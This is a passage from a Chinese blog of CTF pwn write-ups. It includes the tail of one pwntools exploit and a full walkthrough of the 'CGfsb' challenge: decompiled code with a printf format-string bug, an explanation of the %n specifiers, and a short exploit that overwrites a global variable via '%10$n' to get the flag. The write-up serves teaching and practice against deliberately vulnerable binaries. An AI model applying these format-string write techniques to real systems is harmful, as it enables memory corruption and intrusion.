class="line">p.sendline(<span class="string">'AAAA'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'So, where you will go?east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'go into there(1), or leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\'Give me an address\''</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'And, you wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%85c%7$n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Wizard: I will help you! USE YOU SPELL'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(payload2)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>一道关于格式化字符串漏洞的题目</p>
<h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="/攻防世界pwn新手区/10.png" alt><br>这是一个32位的elf文件，开启了NX和canary保护，关闭了PIE地址随机化，简单看了一下，要输入名字和留言内容。</p>
<h2 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">012u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"leave your message please:"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you pwned me, here is your flag:\n"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>printf(&amp;s)</strong> 正确的写法应该是printf(“%s”,s),这是一个格式化字符串漏洞，只有当pwnme是8的时候，才会调用system(“cat flag”)，但是并没找到对pwnme赋值的操作,所以可以首先找到pwnme的地址，然后利用格式化字符串漏洞用%n将pwnme地址写入8</p>
<blockquote>
<p>%d - 十进制 - 输出十进制整数。加上%n可以用于指向地址写数据<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数。如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%c - 字符 - 输出字符，加上%n可用于指向地址写数据<br>%p - 指针 - 指针地址。输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit<br>%n - 到目前为止所写的字符数。%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
</blockquote>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="定位pwnme的地址"><a href="#定位pwnme的地址" class="headerlink" title="定位pwnme的地址"></a>定位pwnme的地址</h3><p>pwnme属于.bss段，是全局变量，没有开启pie保护，所以pwnme的地址是固定的<br>直接用ida查看：地址是0804A068<br>用odjdump查看：objdump -D 5 | grep pwnme</p>
<h3 id="覆盖pwnme的地址"><a href="#覆盖pwnme的地址" class="headerlink" title="覆盖pwnme的地址"></a>覆盖pwnme的地址</h3><p>测一下偏移<br>在第二个printf函数处下断点gdb调试，确定输入的数据是栈中的第几个参数来确定偏移<br><img src="/攻防世界pwn新手区/11.png" alt><br>偏移为10</p>
<h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'46016'</span>)</span><br><span class="line">p.send(<span class="string">'AAAA'</span>)</span><br><span class="line">pwnme = p32(<span class="number">0x0804A068</span>)</span><br><span class="line">p.send(pwnme+<span class="string">'AAAA'</span>+<span class="string">'%10$n'</span>)<span class="comment">#pwnme是四位，需要用AAAA填充为8位，使pwnme为8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

	
		</div>
		
		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<div>分享</div>
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/windows启动过程.html" title="windows启动过程" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/sysmalloc.html" title="sysmalloc" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/数字中国创新大赛.html" title="数字中国创新大赛">
								数字中国创新大赛			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 19日, 2020				
							</p>
							<p class="relate-post-content">
								又是自闭的一天。。


game这一题是关于python字节码的题目，之前没有了解过，看了几篇关于python字节码的文章，死磕，手工还原。。
python字节码
12345678910111213141516171819202122...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/数字中国创新大赛.html" title="数字中国创新大赛">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="数字中国创新大赛"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/hitcontraining-uaf.html" title="hitcontraining_uaf">
								hitcontraining_uaf			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 22日, 2020				
							</p>
							<p class="relate-post-content">
								一道简单的uaf的题目


保护12345Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/hitcontraining-uaf.html" title="hitcontraining_uaf">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="hitcontraining_uaf"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/ez-pz-hackover-2016.html" title="ez_pz_hackover_2016">
								ez_pz_hackover_2016			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 16日, 2020				
							</p>
							<p class="relate-post-content">
								buu的一道pwn


基本信息没有nx保护
1234567ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpret...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/ez-pz-hackover-2016.html" title="ez_pz_hackover_2016">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ez_pz_hackover_2016"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	
		<div class="config-info">
			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
		</div>	
	

</div>
				</div>
				<div class="investment-content-list">
					<div class="layout-share">
	
	

		
			
			<!-- socialShare share -->
			<div class="social-share"></div>

<!--  css & js -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
			
		
		
	
</div>


				</div>
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	<script src="/plugin/clipboard/clipboard.js"></script>
	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>





<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
<script src="/plugin/fancybox/jquery.fancybox.js"></script>

<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	

	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2019 - 2020, content by Thriumph. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->

		
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	

		<span id="busuanzi_container_page_pv">
	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
		</span>

	




			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	<script src="/plugin/motto/motto.js"></script>
	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->

	<script src="/plugin/love/love.js"></script>


<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	<script>
		var _hmt = _hmt || [];
		(function() {
			var hm = document.createElement("script");
			hm.src = "//hm.baidu.com/hm.js?";
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(hm, s);
		})();
	</script>

	
	<script src="//s6.cnzz.com/stat.php?id=&web_id=" type="text/javascript"></script>

	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


  <script src="/plugin/leancloud/av-min.js"></script>
<script src="/js/leancloud-count.js"></script>

	

  


<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>
	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-20,"vOffset":80},"mobile":{"show":false}});</script></body>	
</html>